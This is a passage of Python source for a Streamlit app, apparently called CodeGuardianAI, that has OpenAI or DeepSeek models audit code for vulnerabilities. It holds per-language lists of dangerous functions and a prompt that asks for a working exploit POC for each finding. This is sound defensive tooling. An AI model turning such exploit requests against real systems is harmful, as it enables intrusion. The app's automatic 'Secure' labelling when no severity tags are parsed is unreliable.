import streamlit as st
import openai
import os
import base64
import re
from PIL import Image
import requests
from dotenv import load_dotenv
from typing import Dict, List, Tuple
import hashlib
import logging
import logging.config
import time
from datetime import datetime
import socket
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import json
from pathlib import Path
import zipfile
import io

# Setup logging — load from config file if present, otherwise fall back to basicConfig
_log_config = Path("logging_config.json")
if _log_config.exists():
    with open(_log_config) as _f:
        logging.config.dictConfig(json.load(_f))
else:
    logging.basicConfig(
        level=logging.ERROR,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[logging.FileHandler('security_analyzer.log')]
    )

# Load environment variables
load_dotenv()

REQUIRED_KEYS = {
    "OPENAI_API_KEY": os.getenv("OPENAI_API_KEY"),
    "DEEPSEEK_API_KEY": os.getenv("DEEPSEEK_API_KEY"),
}


def check_password() -> bool:
    """Password gate. Set APP_PASSWORD in .env to enable; skipped when unset."""
    app_password = os.getenv("APP_PASSWORD")
    if not app_password:
        return True
    if st.session_state.get("authenticated"):
        return True

    enhance_streamlit_ui()
    st.markdown("""
        <div class="login-wrap">
            <div class="login-card">
                <div class="login-icon">🛡️</div>
                <div class="login-title">CodeGuardianAI</div>
                <div class="login-sub">Enter your access password to continue</div>
            </div>
        </div>
    """, unsafe_allow_html=True)

    col = st.columns([1, 2, 1])[1]
    with col:
        pwd = st.text_input("Password", type="password", placeholder="Enter password…", label_visibility="collapsed")
        if st.button("Unlock Access", use_container_width=True):
            if pwd == app_password:
                st.session_state["authenticated"] = True
                st.rerun()
            else:
                st.error("Incorrect password. Please try again.")
    return False


def check_internet_connection(host="8.8.8.8", port=53, timeout=3):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            return True
        except (socket.timeout, socket.gaierror, ConnectionRefusedError):
            return False


def generate_text_report(analysis_results: str, base_filename: str = "security_analysis_report") -> tuple:
    """Generate a text report content without saving to file."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{base_filename}_{timestamp}.txt"
    report_content = f"""==============================================
CodeGuardianAI Security Analysis Report
Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
==============================================

{analysis_results}
"""
    return report_content, filename


def generate_download_report(analysis_results):
    """Provide download buttons for text and JSON reports."""
    try:
        if not analysis_results:
            st.error("No analysis results available to generate report")
            return

        report_content, txt_filename = generate_text_report(analysis_results)

        # JSON export
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        vulnerabilities = extract_vulnerabilities(analysis_results)
        json_payload = {
            "generated_at": datetime.now().isoformat(),
            "summary": {
                "total": len(vulnerabilities),
                "by_severity": {},
            },
            "vulnerabilities": [
                {
                    "number": v["number"],
                    "type": v["type"],
                    "severity": v["severity"],
                    "location": v["location"],
                    "code_snippet": v["code_snippet"],
                    "verification": v.get("verification"),
                }
                for v in vulnerabilities
            ],
            "raw_analysis": analysis_results,
        }
        for v in vulnerabilities:
            sev = v["severity"]
            json_payload["summary"]["by_severity"][sev] = json_payload["summary"]["by_severity"].get(sev, 0) + 1

        col1, col2 = st.columns(2)
        with col1:
            st.download_button(
                label="Download TXT Report",
                data=report_content,
                file_name=txt_filename,
                mime="text/plain",
                key="download_report_txt"
            )
        with col2:
            st.download_button(
                label="Download JSON Report",
                data=json.dumps(json_payload, indent=2),
                file_name=f"security_analysis_{timestamp}.json",
                mime="application/json",
                key="download_report_json"
            )
    except Exception as e:
        logging.error(f"Report generation error: {str(e)}", exc_info=True)
        st.error("Error generating report. Please try again.")


_CACHE_DURATION = int(os.getenv("CACHE_DURATION", "86400"))
_CACHE_DIR = Path("cache")
_CACHE_FILE = _CACHE_DIR / "analysis_cache.json"


class APIOptimizer:
    def __init__(self):
        _CACHE_DIR.mkdir(exist_ok=True)
        self.cache_file = _CACHE_FILE
        try:
            with open(self.cache_file, 'r') as f:
                self.cache = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self.cache = {}

    def get_code_hash(self, code: str) -> str:
        return hashlib.sha256(code.encode()).hexdigest()

    def _make_cache_key(self, code: str, query) -> str:
        """Build a deterministic cache key from code content and query."""
        code_hash = self.get_code_hash(code)
        query_hash = hashlib.sha256(str(query).encode()).hexdigest() if query else "full_scan"
        return f"{code_hash}_{query_hash}"

    def get_cached_analysis(self, code: str, query: str = None) -> dict:
        """Retrieve cached analysis if available and fresh."""
        cache_key = self._make_cache_key(code, query)
        if cache_key in self.cache:
            cached_time = datetime.fromisoformat(self.cache[cache_key]['timestamp'])
            if (datetime.now() - cached_time).total_seconds() < _CACHE_DURATION:
                return self.cache[cache_key]['results']
        return None

    def cache_analysis(self, code: str, query: str, results: dict):
        """Store analysis results in cache for later use."""
        cache_key = self._make_cache_key(code, query)
        self.cache[cache_key] = {
            'results': results,
            'timestamp': datetime.now().isoformat()
        }
        try:
            with open(self.cache_file, 'w') as f:
                json.dump(self.cache, f)
            os.chmod(self.cache_file, 0o600)
        except IOError as e:
            logging.error(f"Cache write error: {str(e)}")


class _APIResponse:
    """Simple normalized response wrapper for both OpenAI and Deepseek responses."""

    def __init__(self, content: str):
        self._content = content

    @property
    def choices(self):
        return [self]

    @property
    def message(self):
        return self

    @property
    def content(self):
        return self._content


class APIClient:
    def __init__(self, api_type: str):
        self.api_type = api_type.lower()
        if self.api_type == "openai":
            self._openai_client = openai.OpenAI(api_key=os.getenv("OPENAI_API_KEY"))
        elif self.api_type == "deepseek":
            self.session = requests.Session()
            self.session.headers.update({
                "Authorization": f"Bearer {os.getenv('DEEPSEEK_API_KEY')}",
                "Content-Type": "application/json"
            })
        else:
            raise ValueError("Unsupported API type. Please use 'openai' or 'deepseek'.")

    def create_completion(self, messages: list, **kwargs) -> _APIResponse:
        """Create completion with the chosen API provider, always returning an _APIResponse."""
        try:
            if self.api_type == "openai":
                response = self._openai_client.chat.completions.create(
                    model=os.getenv("OPENAI_MODEL", "gpt-3.5-turbo"),
                    messages=messages,
                    temperature=kwargs.get('temperature', 0.1),
                    max_tokens=kwargs.get('max_tokens', 3000)
                )
                content = response.choices[0].message.content
                return _APIResponse(content)

            elif self.api_type == "deepseek":
                payload = {
                    "model": os.getenv("DEEPSEEK_MODEL", "deepseek-chat"),
                    "messages": messages,
                    "temperature": kwargs.get('temperature', 0.1),
                    "max_tokens": kwargs.get('max_tokens', 3000),
                    "stream": False
                }
                response = self.session.post(
                    "https://api.deepseek.com/v1/chat/completions", json=payload
                )
                resp_data = response.json()
                if not resp_data.get('choices'):
                    raise ValueError("No response choices available")
                content = resp_data['choices'][0]['message'].get('content')
                if not content:
                    raise ValueError("No content in API response")
                return _APIResponse(content)

        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {str(e)}")
            raise ValueError(f"API request failed: {str(e)}")
        except Exception as e:
            logging.error(f"API error: {str(e)}")
            raise ValueError(f"API error: {str(e)}")


class SecurityAnalyzer:
    def __init__(self):
        self.vulnerability_categories = {
            "injection": [
                "SQL Injection", "Command Injection", "Code Injection",
                "LDAP Injection", "XPath Injection",
                "Server-Side Template Injection (SSTI)",
                "Header Injection", "Email Header Injection",
            ],
            "rce": [
                "Remote Code Execution", "Arbitrary Code Execution",
                "Unsafe Deserialization / Object Injection",
                "Dynamic Code Evaluation",
            ],
            "path_traversal": [
                "Directory Traversal", "Path Traversal",
                "Arbitrary File Read", "Arbitrary File Write",
                "Local File Inclusion (LFI)", "Remote File Inclusion (RFI)",
            ],
            "ssrf": [
                "Server-Side Request Forgery (SSRF)", "Blind SSRF",
            ],
            "xxe": [
                "XML External Entity Injection (XXE)", "XML Injection",
            ],
            "xss": [
                "Cross-Site Scripting — Reflected",
                "Cross-Site Scripting — Stored",
                "Cross-Site Scripting — DOM-based",
                "HTML Injection",
            ],
            "open_redirect": [
                "Open Redirect", "Unvalidated URL Redirect",
            ],
            "auth": [
                "Authentication Bypass", "Authorization Bypass",
                "Privilege Escalation", "Broken Access Control",
                "Insecure Direct Object Reference (IDOR)",
                "Missing Function-Level Access Control",
            ],
            "session": [
                "Session Fixation", "Session Hijacking",
                "Insecure Session Configuration", "Missing Session Expiration",
            ],
            "crypto": [
                "Weak Cryptographic Algorithm (MD5/SHA1 for passwords)",
                "Insecure Randomness (rand/Math.random for security tokens)",
                "Hardcoded Credentials or Secrets",
                "Broken Password Storage",
                "Missing or Weak Encryption",
            ],
            "csrf": [
                "Cross-Site Request Forgery (CSRF)",
            ],
            "data": [
                "Sensitive Data Exposure", "Information Disclosure",
                "Verbose Error Messages", "Sensitive Data in Logs",
                "Data Leakage via API Response",
            ],
            "misconfiguration": [
                "Security Misconfiguration", "Debug Mode in Production",
                "Insecure Default Configurations",
                "Unnecessary Features / Services Enabled",
                "Missing Security Headers",
            ],
            "insecure_design": [
                "Insecure Design", "Race Condition / TOCTOU",
                "Business Logic Vulnerability",
                "Mass Assignment / Parameter Pollution",
            ],
        }

        self.language_specific_checks = {
            "php": {
                'critical_functions': [
                    # Code execution
                    "eval()", "assert() with user input", "create_function()",
                    "preg_replace() with /e modifier",
                    # OS command execution
                    "system()", "exec()", "shell_exec()", "passthru()",
                    "popen()", "proc_open()", "pcntl_exec()",
                    # Deserialization
                    "unserialize()", "json_decode() feeding into unserialize()",
                    # File operations
                    "include()/require() with user input",
                    "include_once()/require_once() with user input",
                    "file_get_contents() with URL", "file_put_contents()",
                    "move_uploaded_file()", "readfile()", "fopen()",
                    # Database (legacy)
                    "mysql_query()", "mysqli_query() without prepared statements",
                    # Variable injection
                    "extract($_GET/$_POST/$_REQUEST/$_COOKIE)",
                    "parse_str() without second arg", "$$variable (variable variables)",
                    # Weak crypto / hashing
                    "md5() for passwords", "sha1() for passwords",
                    "rand()/mt_rand() for security tokens",
                    # XSS
                    "echo/print of unescaped user input",
                    "header() without sanitization (open redirect/injection)",
                    # XXE
                    "simplexml_load_string()", "DOMDocument::loadXML()",
                    "SimpleXMLElement()", "XMLReader",
                    # SSRF
                    "curl_exec() with user-controlled URL",
                    "file_get_contents() with user-controlled URL",
                    # Session
                    "session_id() with user input (session fixation)",
                    # Mail injection
                    "mail() with user-controlled headers",
                ],
            },
            "python": {
                'critical_functions': [
                    # Code execution
                    "eval()", "exec()", "compile()", "__import__()",
                    "importlib.import_module() with user input",
                    # OS commands
                    "os.system()", "os.popen()", "os.exec*()",
                    "subprocess.call()", "subprocess.run(shell=True)",
                    "subprocess.Popen(shell=True)", "commands.getoutput()",
                    # Deserialization
                    "pickle.loads()", "pickle.load()", "marshal.loads()",
                    "shelve.open()", "yaml.load() without Loader",
                    "jsonpickle.decode()",
                    # Templating
                    "jinja2.Template() with user input",
                    "Mako / Tornado template with user input",
                    # Weak crypto
                    "hashlib.md5() for passwords", "hashlib.sha1() for passwords",
                    "random.random()/random.randint() for security tokens",
                    # SQL
                    "sqlite3.execute() with string formatting",
                    "cursor.execute() with % or .format()",
                    # XML
                    "xml.etree.ElementTree.parse() — XXE risk",
                    "lxml.etree without resolve_entities=False",
                    # SSRF
                    "urllib.request.urlopen() with user input",
                    "requests.get/post() with user-controlled URL",
                    # File ops
                    "open() in write mode with user-controlled path",
                    "tempfile.mktemp() (TOCTOU race condition)",
                ],
            },
            "javascript": {
                'critical_functions': [
                    # Code execution
                    "eval()", "new Function()", "setTimeout(string)",
                    "setInterval(string)", "execScript()",
                    # XSS sinks
                    "innerHTML", "outerHTML", "insertAdjacentHTML()",
                    "document.write()", "document.writeln()",
                    "$.html() (jQuery)", "dangerouslySetInnerHTML (React)",
                    "v-html (Vue)", "bypassSecurityTrust* (Angular)",
                    # Open redirect
                    "window.location = user_input",
                    "location.href = user_input",
                    # Prototype pollution
                    "Object.assign() with user input",
                    "merge/extend functions with user input",
                    # Node.js / server-side
                    "child_process.exec()", "child_process.execSync()",
                    "child_process.spawn(shell:true)",
                    "require() with user input",
                    # Weak crypto
                    "Math.random() for security tokens",
                    "crypto.createHash('md5') for passwords",
                    # Storage
                    "localStorage.setItem() with sensitive data",
                    "document.cookie with missing Secure/HttpOnly",
                    # PostMessage
                    "postMessage() without origin validation",
                    "addEventListener('message') without origin check",
                    # SSRF (Node)
                    "http.get() with user-controlled URL",
                    "axios.get() with user-controlled URL",
                ],
            },
            "java": {
                'critical_functions': [
                    "Runtime.exec()", "ProcessBuilder with user input",
                    "ObjectInputStream.readObject() — deserialization",
                    "XMLDecoder.readObject() — deserialization",
                    "Statement.execute() without PreparedStatement",
                    "XPath.evaluate() with user input — injection",
                    "ScriptEngine.eval() with user input",
                    "Class.forName() with user input",
                    "URL(user_input).openStream() — SSRF",
                    "MessageFormat.format() with user input — injection",
                    "Random() for security tokens — use SecureRandom",
                    "MD5/SHA1 MessageDigest for passwords",
                ],
            },
        }

        self.severity_levels = {
            "critical": 5,
            "high": 4,
            "medium": 3,
            "low": 2,
            "info": 1,
            "secure": 0
        }

    def _detect_language(self, code: str, filename: str = None) -> str:
        """Detect the programming language from filename or code content."""
        if filename:
            ext = filename.rsplit('.', 1)[-1].lower()
            ext_map = {
                'php': 'php', 'py': 'python', 'js': 'javascript',
                'java': 'java', 'cpp': 'c++', 'cs': 'csharp'
            }
            if ext in ext_map:
                return ext_map[ext]
        # Fallback: detect from content
        if re.search(r'<\?php', code):
            return 'php'
        return None

    def create_enhanced_prompt(self, code: str, language: str = None) -> str:
        lang = language if language else "code"

        # Build category checklist
        category_block = ""
        for category, checks in self.vulnerability_categories.items():
            indicator = self._get_severity_indicator(category)
            category_block += f"\n  {indicator} {category.upper()}: {', '.join(checks)}"

        # Build language function list
        lang_block = ""
        if language and language.lower() in self.language_specific_checks:
            funcs = self.language_specific_checks[language.lower()]['critical_functions']
            lang_block = f"\n\n{language.upper()} DANGEROUS FUNCTIONS/PATTERNS TO CHECK:\n"
            for f in funcs:
                lang_block += f"  • {f}\n"

        # Language-specific deep analysis instructions
        lang_deep = self._get_language_deep_analysis(language)

        prompt = f"""You are a senior penetration tester and code security auditor with 15+ years of experience.
Your job is to find EVERY security vulnerability in the {lang} code below — including subtle ones.

━━━━━━━━━━━━━━━━━━ OUTPUT FORMAT ━━━━━━━━━━━━━━━━━━
For EACH vulnerability use this EXACT format (do not skip any field):

## [SEVERITY] Vulnerability #N: VULNERABILITY_TYPE

- **Location:** Line(s) X or X-Y
- **Code Snippet:**
```
<exact vulnerable code>
```
- **CWE:** CWE-XXX — Name
- **OWASP 2021:** AXXXX — Category Name
- **Confidence:** High | Medium | Low
- **Attack Vector:** <who can exploit this and how>
- **POC:** <minimal working exploit or proof of exploitability>
- **Impact:** <what an attacker gains>
- **Fix:**
```
<minimal corrected code>
```

Allowed SEVERITY values: Critical, High, Medium, Low, Info
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SEVERITY GUIDE:
- Critical: Direct RCE, full auth bypass, critical data exposure — exploitable immediately
- High: SQL injection, stored XSS, SSRF, deserialization, significant auth flaw
- Medium: Reflected XSS, open redirect, CSRF, information disclosure
- Low: Missing header, verbose error, low-impact misconfiguration
- Info: Best-practice note, not directly exploitable

━━━━━━━━━━━━━━━━━ WHAT TO LOOK FOR ━━━━━━━━━━━━━━━━━
OWASP Top 10 (2021) — check ALL of these:
  A01 Broken Access Control — IDOR, privilege escalation, missing authz
  A02 Cryptographic Failures — MD5/SHA1 passwords, hardcoded secrets, weak random
  A03 Injection — SQL, Command, LDAP, XPath, SSTI, Header injection
  A04 Insecure Design — race conditions, logic flaws, mass assignment
  A05 Security Misconfiguration — debug mode, verbose errors, default creds
  A06 Vulnerable Components — outdated/dangerous library usage
  A07 Auth Failures — session fixation, weak tokens, missing expiry
  A08 Integrity Failures — unsafe deserialization, object injection
  A09 Logging Failures — sensitive data in logs, missing audit trail
  A10 SSRF — user-controlled URL fetching without validation
{category_block}
{lang_block}{lang_deep}

━━━━━━━━━━━━━━━━━━ TAINT ANALYSIS ━━━━━━━━━━━━━━━━━━
For each finding, mentally trace the data from SOURCE to SINK:
  Sources: user input ($_GET/$_POST/$_REQUEST/$_COOKIE/argv/env/DB/file/network)
  Sinks: DB queries, OS commands, file ops, HTML output, redirects, XML/URL parsers
Report a vulnerability whenever tainted data reaches a dangerous sink without proper sanitization.

━━━━━━━━━━━━━━━━━━━ INSTRUCTIONS ━━━━━━━━━━━━━━━━━━━
1. Do NOT skip vulnerabilities because they seem "unlikely" to be exploited.
2. Report ALL severity levels — do not limit yourself to Critical/High only.
3. Check EVERY function call, not just obvious ones.
4. Trace data flow through variables, function calls, and class properties.
5. If the code is genuinely secure, begin your response with:
   ## [Secure] No Vulnerabilities Detected
   and explain your reasoning.

━━━━━━━━━━━━━━━━━━━ CODE TO ANALYZE ━━━━━━━━━━━━━━━━━
Language: {lang}

```{lang}
{code}
```
"""
        return prompt

    def _get_language_deep_analysis(self, language: str) -> str:
        """Return language-specific deep analysis instructions."""
        guides = {
            "php": """
PHP DEEP ANALYSIS CHECKLIST:
  1. XSS: Check EVERY echo/print/<?= for unescaped variables. A single htmlspecialchars()
     elsewhere in the file does NOT protect other output points.
  2. SQL Injection: Any $_GET/$_POST/$_COOKIE/$_SESSION/$_SERVER directly in a query string
     is injectable. Only bound parameters in prepared statements are safe.
  3. Password Hashing: md5/sha1 of password = Critical. Must use password_hash(PASSWORD_BCRYPT).
  4. File Upload: $_FILES with extension-only validation = Critical RCE risk.
  5. Deserialization: unserialize() on user input = Critical (PHP Object Injection).
  6. Variable Injection: extract(), parse_str(), $$var — can overwrite any variable.
  7. Weak Randomness: rand()/mt_rand() for tokens/OTPs = Predictable values.
  8. Path Traversal: include/require/readfile/file_get_contents with user input.
  9. SSRF: curl or file_get_contents with user-controlled URL.
  10. Open Redirect: header("Location: " . $user_input) without validation.
  11. Session Fixation: session_id($_GET['sid']) lets attacker set session ID.
  12. XXE: simplexml_load_string/DOMDocument::loadXML without disabling external entities.
  13. Type Juggling: loose == comparisons with "0e..." hashes bypass auth.
  14. assert() with string argument is eval() — RCE if user-controlled.
""",
            "python": """
PYTHON DEEP ANALYSIS CHECKLIST:
  1. Command Injection: os.system/subprocess with shell=True and user input = RCE.
  2. Code Injection: eval()/exec()/compile() with user input = RCE.
  3. Deserialization: pickle.loads/marshal.loads on untrusted data = RCE.
  4. SSTI: Jinja2/Mako template rendered with unsanitized user input.
  5. SQL Injection: cursor.execute("SELECT..." % user_input) — use ? placeholders.
  6. XXE: xml.etree.ElementTree does not disable external entities by default.
  7. SSRF: requests.get(user_url) without allowlist = SSRF.
  8. Weak Crypto: hashlib.md5/sha1 for passwords; use bcrypt/argon2.
  9. Insecure Random: random.random() for tokens — use secrets module.
  10. Path Traversal: open(user_path) without normalization and root-checking.
  11. YAML: yaml.load() without Loader=yaml.SafeLoader executes arbitrary Python.
  12. Race Condition: tempfile.mktemp() is TOCTOU-vulnerable; use mkstemp().
""",
            "javascript": """
JAVASCRIPT / NODE.JS DEEP ANALYSIS CHECKLIST:
  1. XSS: innerHTML/outerHTML/insertAdjacentHTML/document.write with user data = XSS.
  2. eval(): ANY eval/Function()/setTimeout(string) with user input = RCE/XSS.
  3. Prototype Pollution: recursive merge of user-controlled objects can pollute Object.prototype.
  4. Command Injection (Node): child_process.exec/execSync with user input = RCE.
  5. Path Traversal (Node): fs.readFile(req.params.file) without path normalization.
  6. Open Redirect: res.redirect(req.query.url) without validation.
  7. Insecure Random: Math.random() for tokens — use crypto.randomBytes().
  8. PostMessage: addEventListener('message', fn) must verify event.origin.
  9. Regex DoS (ReDoS): catastrophic backtracking in regex applied to user input.
  10. JWT: verify() must check algorithm — none algorithm bypass.
  11. SSRF (Node): http.get/axios with user-controlled URL.
  12. Sensitive storage: tokens/passwords in localStorage are accessible to XSS.
""",
            "java": """
JAVA DEEP ANALYSIS CHECKLIST:
  1. SQL Injection: Statement.execute() — must use PreparedStatement with parameters.
  2. Deserialization: ObjectInputStream.readObject() on untrusted data = RCE.
  3. XXE: DocumentBuilderFactory without setFeature(DISALLOW_DOCTYPE_DECL).
  4. Command Injection: Runtime.exec()/ProcessBuilder with user input.
  5. Path Traversal: new File(userInput) without canonicalization check.
  6. SSTI: FreeMarker/Velocity template with user-controlled template string.
  7. Weak Crypto: MD5/SHA1 for passwords; use bcrypt/PBKDF2.
  8. Insecure Random: new Random() for tokens — use SecureRandom.
  9. SSRF: URL(userInput).openStream() without allowlist.
  10. Open Redirect: response.sendRedirect(request.getParameter("url")).
""",
        }
        return guides.get(language.lower() if language else "", "")

    def _get_severity_description(self, severity: str) -> str:
        descriptions = {
            "CRITICAL": "Needs immediate attention - Direct system/data compromise",
            "HIGH": "Should be fixed soon - Significant security impact",
            "MEDIUM": "Plan to address - Moderate security impact",
            "LOW": "Good to fix when possible - Limited security impact",
            "INFO": "Not a vulnerability - Just something to be aware of",
            "SECURE": "Code appears secure - No vulnerabilities detected"
        }
        return descriptions.get(severity, "Unknown severity level")

    def _get_severity_indicator(self, category: str) -> str:
        indicators = {
            "injection": "[Critical]",
            "rce": "[Critical]",
            "auth": "[High]",
            "data": "[Medium]"
        }
        return indicators.get(category.lower(), "[Low]")

    def _add_summary(self, content: str) -> str:
        """Add a vulnerability summary header to analysis results."""
        if "[Secure] No Vulnerabilities Detected" in content:
            return content
        if content.startswith("## Summary"):
            return content

        critical = len(re.findall(r"\[Critical\]", content))
        high = len(re.findall(r"\[High\]", content))
        medium = len(re.findall(r"\[Medium\]", content))
        low = len(re.findall(r"\[Low\]", content))
        info = len(re.findall(r"\[Info\]", content))
        total_vulns = critical + high + medium + low

        summary = "## Summary\n"
        if total_vulns == 0:
            summary += "No confirmed vulnerabilities detected.\n\n"
            if info > 0:
                summary += f"{info} informational note(s) provided.\n\n"
            if "[Secure]" not in content:
                content = (
                    "## [Secure] No Vulnerabilities Detected\n\n"
                    "The code appears to be secure. No exploitable vulnerabilities were identified.\n\n"
                    + content
                )
        else:
            summary += f"Found {total_vulns} potential security issue(s):\n"
            if critical > 0:
                summary += f"- {critical} Critical\n"
            if high > 0:
                summary += f"- {high} High\n"
            if medium > 0:
                summary += f"- {medium} Medium\n"
            if low > 0:
                summary += f"- {low} Low\n"
            if info > 0:
                summary += f"- {info} Info\n"
            summary += "\nPlease review each finding carefully to confirm it is a real vulnerability.\n\n"

        return summary + content

    def analyze_code(self, code: str, user_query: str, api_type: str, filename: str = None) -> Dict:
        """Analyze code using the selected API with caching."""
        try:
            api_optimizer = APIOptimizer()

            # Check cache first
            cached_result = api_optimizer.get_cached_analysis(code, user_query)
            if cached_result:
                logging.info("Using cached analysis results")
                return cached_result

            language = self._detect_language(code, filename)

            # Use dedicated PHP analyzer for PHP files
            if language == 'php':
                result = analyze_php_security(code, api_type)
            else:
                result = self._analyze_generic(code, user_query, api_type, language)

            # Cache successful results
            if result.get("status") == "success":
                api_optimizer.cache_analysis(code, user_query, result)

            return result

        except Exception as e:
            logging.error(f"Analysis error: {str(e)}")
            return {
                "status": "error",
                "message": "Analysis failed. Please check your API key and try again."
            }

    def _analyze_generic(self, code: str, user_query: str, api_type: str, language: str = None) -> Dict:
        """Generic analysis for non-PHP languages."""
        client = APIClient(api_type)
        analysis_prompt = self.create_enhanced_prompt(code, language)

        if user_query:
            analysis_prompt += f"\n\nFOCUS AREA: {user_query}"

        messages = [
            {"role": "system", "content": "You are a security analyst. Analyze the code thoroughly and report any security vulnerabilities."},
            {"role": "user", "content": analysis_prompt}
        ]

        response = client.create_completion(
            messages=messages,
            temperature=0.1,
            max_tokens=3000,
        )

        content = response.choices[0].message.content
        if not content:
            raise ValueError("Empty response content")

        # Run deterministic checks for supported languages and merge findings
        deterministic = None
        lang = (language or "").lower()
        if lang == "python":
            deterministic = verify_python_security(code)
        elif lang == "javascript":
            deterministic = verify_javascript_security(code)

        if deterministic:
            content = deterministic + "\n\n---\n\n### AI Analysis\n\n" + content

        processed_content = self._add_summary(content)
        return {
            "status": "success",
            "analysis": processed_content,
            "metadata": {
                "api": api_type,
                "timestamp": datetime.now().isoformat(),
                "query": user_query
            }
        }


def _batch_verify_vulnerabilities(vulnerabilities: list, api_type: str) -> list:
    """Verify all vulnerabilities in a single API call. Returns list of verification dicts."""
    if not vulnerabilities:
        return []

    vuln_lines = []
    for i, v in enumerate(vulnerabilities, 1):
        snippet = v["code_snippet"][:300] if v["code_snippet"] else "(no snippet)"
        vuln_lines.append(
            f"[{i}] Type={v['type']} | Severity={v['severity']} | Location={v['location']}\n"
            f"    Snippet: {snippet}"
        )

    prompt = (
        "You are a security verification expert. For each vulnerability listed below, "
        "determine if it is a TRUE POSITIVE or FALSE POSITIVE.\n\n"
        "For EACH item respond with exactly this format (one block per item, no extra text):\n\n"
        "ID: <number>\n"
        "Verdict: TRUE POSITIVE or FALSE POSITIVE\n"
        "Confidence: <0-100>\n"
        "Explanation: <one sentence>\n\n"
        "VULNERABILITIES TO VERIFY:\n\n"
        + "\n\n".join(vuln_lines)
    )

    try:
        client = APIClient(api_type)
        response = client.create_completion(
            messages=[
                {"role": "system", "content": "You are a security verification expert."},
                {"role": "user", "content": prompt}
            ],
            temperature=0,
            max_tokens=min(300 * len(vulnerabilities), 3000)
        )
        content = response.choices[0].message.content

        results = []
        for i in range(1, len(vulnerabilities) + 1):
            block_pattern = rf"ID:\s*{i}\s*\nVerdict:\s*(TRUE POSITIVE|FALSE POSITIVE)\s*\nConfidence:\s*(\d+)\s*\nExplanation:\s*([^\n]+)"
            m = re.search(block_pattern, content, re.IGNORECASE)
            if m:
                results.append({
                    "verdict": m.group(1).upper(),
                    "confidence": int(m.group(2)),
                    "explanation": m.group(3).strip(),
                })
            else:
                results.append({"verdict": "UNCERTAIN", "confidence": 50, "explanation": "Could not parse verification response."})
        return results

    except Exception as e:
        logging.error(f"Batch verification error: {str(e)}")
        return [{"verdict": "ERROR", "confidence": 0, "explanation": "Verification failed."} for _ in vulnerabilities]


def extract_vulnerabilities(analysis_text: str) -> list:
    """Extracts individual vulnerabilities from the analysis text."""
    # Case-insensitive match; also accept "Vuln" abbreviation
    vulnerability_pattern = re.compile(
        r"##\s*\[(Critical|High|Medium|Low)\]\s*Vulnerability\s*#(\d+):\s*([^\n]+)",
        re.IGNORECASE,
    )
    vulnerability_matches = list(vulnerability_pattern.finditer(analysis_text))

    emoji_map = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}
    # Canonical capitalisation
    severity_canon = {"critical": "Critical", "high": "High", "medium": "Medium", "low": "Low"}

    vulnerabilities = []
    for i, match in enumerate(vulnerability_matches):
        sev_raw, number, vuln_type = match.groups()
        severity = severity_canon.get(sev_raw.lower(), sev_raw.capitalize())
        emoji = emoji_map.get(sev_raw.lower(), "")

        segment = analysis_text[match.end():]

        # Accept "Line X", "Lines X", "Lines X-Y", "Line ~X"
        location_match = re.search(
            r"\*\*Location:\*\*\s*(?:Lines?\s*~?)?([\d\-,]+)",
            segment,
            re.IGNORECASE,
        )
        location = location_match.group(1) if location_match else "Unknown"

        snippet_match = re.search(
            r"\*\*Code Snippet:\*\*\s*```[^\n]*\n(.*?)```",
            segment,
            re.DOTALL,
        )
        code_snippet = snippet_match.group(1).strip() if snippet_match else ""

        end_pos = vulnerability_matches[i + 1].start() if i + 1 < len(vulnerability_matches) else len(analysis_text)

        vulnerabilities.append({
            "emoji": emoji,
            "severity": severity,
            "number": number,
            "type": vuln_type.strip(),
            "location": location,
            "code_snippet": code_snippet,
            "full_content": analysis_text[match.start():end_pos].strip(),
        })

    return vulnerabilities


def verify_all_vulnerabilities(analysis_text: str, api_type: str, confidence_threshold: str) -> str:
    """Verifies all vulnerabilities and filters based on confidence threshold."""
    vulnerabilities = extract_vulnerabilities(analysis_text)

    if not vulnerabilities:
        return analysis_text

    threshold_values = {"Low": 30, "Medium": 60, "High": 80}
    threshold = threshold_values.get(confidence_threshold, 60)

    verifications = _batch_verify_vulnerabilities(vulnerabilities, api_type)
    verified_vulnerabilities = []
    for vuln, verification in zip(vulnerabilities, verifications):
        vuln["verification"] = verification
        if verification["verdict"] == "TRUE POSITIVE" and verification["confidence"] >= threshold:
            verified_vulnerabilities.append(vuln)

    if not verified_vulnerabilities:
        return (
            "## [Secure] No Verified Vulnerabilities Detected\n\n"
            f"The initial analysis identified {len(vulnerabilities)} potential issues, "
            f"but none passed verification at the current confidence threshold ({confidence_threshold}).\n\n"
            "### Original Analysis (Not Verified)\n\n" + analysis_text
        )

    new_analysis = "## Summary\n\n"
    new_analysis += f"Found {len(verified_vulnerabilities)} verified vulnerabilities out of {len(vulnerabilities)} reported issues.\n\n"

    severity_counts: Dict[str, int] = {}
    for vuln in verified_vulnerabilities:
        sev = vuln["severity"]
        severity_counts[sev] = severity_counts.get(sev, 0) + 1

    emoji_map = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🟢"}
    for severity, count in severity_counts.items():
        emoji = emoji_map.get(severity, "")
        new_analysis += f"- {emoji} {count} {severity}\n"

    new_analysis += "\n\n"

    for i, vuln in enumerate(verified_vulnerabilities, 1):
        updated_content = re.sub(
            r"##\s*\[(Critical|High|Medium|Low)\]\s*Vulnerability\s*#\d+:",
            f"## [{vuln['severity']}] Vulnerability #{i}:",
            vuln["full_content"],
            flags=re.IGNORECASE,
        )
        verification_info = (
            f"\n\n**Verification:** Confirmed with {vuln['verification']['confidence']}% confidence\n"
            f"**Justification:** {vuln['verification']['explanation']}\n"
        )
        updated_content += verification_info
        new_analysis += updated_content + "\n\n"

    filtered_count = len(vulnerabilities) - len(verified_vulnerabilities)
    if filtered_count > 0:
        new_analysis += f"### Note\n\n{filtered_count} potential issue(s) were filtered out due to insufficient confidence.\n"

    return new_analysis


def _strip_code_comments(code: str, language: str) -> str:
    """Remove comments so regex checks do not fire on commented-out code."""
    lang = (language or "").lower()
